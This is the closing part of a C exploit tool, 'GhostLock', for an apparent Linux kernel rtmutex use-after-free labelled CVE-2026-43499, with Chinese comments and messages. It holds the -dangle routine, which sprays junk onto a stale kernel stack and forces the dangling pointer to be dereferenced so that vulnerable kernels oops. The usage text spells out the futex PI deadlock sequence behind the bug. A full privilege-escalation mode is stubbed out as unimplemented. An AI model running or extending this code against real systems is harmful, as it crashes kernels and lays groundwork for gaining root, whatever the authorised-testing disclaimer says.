        return 3;
    }

    if (!gl_futex_pi_supported()) {
        pr_err("本机没有 FUTEX_PI，无此攻击面\n");
        return 3;
    }

    pr_info("dangle: 回滚 -> waiter 超时返回 -> 灌垃圾 -> 再抢锁触发链走\n");
    if (atomic_load(&g_tag_mode))
        pr_dim("    标记喷射已开启: pselect6=0x%02x / poll=0x%02x / bind=0x%02x\n"
               "    崩了就看 dmesg 里的 CR2 —— 哪个标记出现，就是哪个原语盖到了\n"
               "    waiter->lock。三个都不出现，说明三种栈帧深度都没够着，\n"
               "    需要换更深的原语（recvmmsg / sendmmsg / io_uring_enter）。\n\n",
               junk, (junk + 1) & 0xff, (junk + 2) & 0xff);
    else
        pr_dim("    灌进去的是 0x%02x，不构造任何合法字段，纯破坏。\n"
               "    命中时 dmesg 里的 fault 地址应该是 0x%02x... 附近。\n"
               "    想定位是哪个 syscall 盖到的，加 -tag 再跑一次。\n\n",
               junk, junk);

    /*
     * 放进子进程：
     *   命中 -> 内核给子进程发 SIGSEGV/SIGBUS，父进程还能打印结论；
     *   未命中 -> 主线程正常睡在那把锁上，父进程超时把它收掉。
     */
    pid = fork();
    if (pid < 0) {
        pr_err("fork 失败: %s\n", strerror(errno));
        return 3;
    }
    if (pid == 0) {
        int rc = gl_dangle_once(verbose);

        fflush(NULL);
        _exit(rc);
    }

    for (i = 0; i < 120; i++) {          /* 最多等 12 秒 */
        pid_t w = waitpid(pid, &st, WNOHANG);

        if (w == pid) {
            reaped = 1;
            break;
        }
        usleep(100000);
    }

    if (!reaped) {
        kill(pid, SIGKILL);
        waitpid(pid, &st, 0);
        pr_warn("子进程一直睡在 LOCK_PI 上，被强制回收\n");
        pr_dim("    说明 rt_mutex_adjust_prio_chain() 在 `if (!waiter)` 就退出了，\n"
               "    也就是 waiter 的 pi_blocked_on 被正确清空 —— 本机大概率已修复。\n");
        return 1;
    }

    if (WIFSIGNALED(st)) {
        pr_ok("子进程被信号 %d 终止 —— 悬空指针确实被解引用了\n",
              WTERMSIG(st));
        pr_dim("    接着看 dmesg | tail -40，应能找到:\n"
               "      general protection fault / BUG: unable to handle\n"
               "      RIP: rt_mutex_adjust_prio_chain+0x...\n"
               "    调用栈: task_blocks_on_rt_mutex -> rt_mutex_slowlock\n"
               "            -> futex_lock_pi -> do_futex\n"
               "    fault 地址 0x%02x%02x... 就是本程序灌进去的字节。\n",
               junk, junk);
        return 0;
    }

    if (WIFEXITED(st) && WEXITSTATUS(st) == 0) {
        pr_warn("子进程正常退出，但没有触发 oops\n");
        return 1;
    }

    pr_warn("未完成，退出状态 0x%x\n", st);
    return 1;
}

/* -------------------------------------------------------------------------
 * 用法
 * ---------------------------------------------------------------------- */

static void usage(const char *argv0)
{
    printf("GhostLock / CVE-2026-43499  rtmutex remove_waiter() 内核栈 UAF\n"
           "版本 %s\n\n", GL_VERSION);
    printf("用法: %s <模式> [选项]\n\n", argv0);
    printf("模式:\n");
    printf("  -check              检查内核版本、FUTEX_PI、风险参数（只读）\n");
    printf("  -trigger            触发 PI 死锁回滚，验证序列可达（安全，可重复）\n");
    printf("  -dangle             第一步：把悬空指针搞出来并直接解引用，\n");
    printf("                      漏洞内核必然 oops（危险，-probe 同义）\n");
    printf("  -start              完整提权链（本阶段未实现）\n");
    printf("  -h, --help          显示本帮助\n\n");
    printf("选项:\n");
    printf("  -n <次数>           -trigger 的尝试次数，默认 1\n");
    printf("  -junk <hex>         -dangle 灌进内核栈的填充字节，默认 41\n");
    printf("  -tag                -dangle 三个灌栈原语分别用 junk/junk+1/junk+2，\n");
    printf("                      从 CR2 反推是哪个 syscall 命中的（诊断用）\n");
    printf("  -v                  输出每一步的返回值\n");
    printf("  -nc                 关闭彩色输出\n\n");
    printf("说明:\n");
    printf("  触发拓扑: waiter 持 f_pi_chain 后阻塞于 WAIT_REQUEUE_PI(f_wait->f_pi_target)；\n"
           "  owner 持 f_pi_target 并阻塞于 f_pi_chain；主线程发起 CMP_REQUEUE_PI，\n"
           "  形成 waiter->target->owner->chain->waiter 的环，内核回滚时清错\n"
           "  pi_blocked_on，留下指向内核栈的悬垂指针。\n\n");
    printf("  -dangle 与 -trigger 的区别:\n"
           "  -trigger 只证明回滚路径可达（打补丁的内核同样返回 EDEADLK）；\n"
           "  -dangle 则在 waiter 返回后往那块失效的栈上灌垃圾，再抢一把锁逼内核\n"
           "  做 PI 链走，第一句读 pi_blocked_on 就踩空 —— 崩了才算真的存在 UAF。\n"
           "  这一步不做任何伪造，只验证悬空指针本身。\n\n");
    printf("  本工具只应用于自有机器或明确授权的测试环境。\n");
}

/* -------------------------------------------------------------------------
 * main
 * ---------------------------------------------------------------------- */

int main(int argc, char **argv)
{
    const char *mode = NULL;
    int attempts = 1, verbose = 0, force = 0, i;

    atomic_store(&g_junk_byte, 0x41);

    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
            usage(argv[0]);
            return 0;
        }
        if (!strcmp(argv[i], "-nc")) {
            g_color = 0;
            continue;
        }
        if (!strcmp(argv[i], "-v")) {
            verbose = 1;
            continue;
        }
        if (!strcmp(argv[i], "-force")) {
            force = 1;
            continue;
        }
        if (!strcmp(argv[i], "-tag")) {
            atomic_store(&g_tag_mode, 1);
            continue;
        }
        if (!strcmp(argv[i], "-junk") && i + 1 < argc) {
            unsigned long v = strtoul(argv[++i], NULL, 16);

            atomic_store(&g_junk_byte, (int)(v & 0xff));
            continue;
        }
        if (!strcmp(argv[i], "-n") && i + 1 < argc) {
            attempts = atoi(argv[++i]);
            if (attempts < 1)
                attempts = 1;
            if (attempts > 1000)
                attempts = 1000;
            continue;
        }
        if (argv[i][0] == '-') {
            mode = argv[i];
            continue;
        }
    }

    if (g_color)
        gl_color_init();

    if (!mode) {
        usage(argv[0]);
        return 2;
    }

    if (!strcmp(mode, "-check"))
        return gl_check();

    if (!strcmp(mode, "-trigger"))
        return gl_trigger(attempts, verbose);

    if (!strcmp(mode, "-dangle") || !strcmp(mode, "-probe"))
        return gl_dangle(force, verbose);

    if (!strcmp(mode, "-start")) {
        pr_warn("-start 完整利用链尚未实现\n");
        pr_dim("    依赖: KASLR 泄漏 + 内核栈喷射 + rtmutex 写原语 + 目标符号偏移。\n"
               "    这些需要按目标内核逐一定标，先跑 -trigger 与 -probe。\n");
        return 3;
    }

    pr_err("未知模式: %s\n\n", mode);
    usage(argv[0]);
    return 2;
}
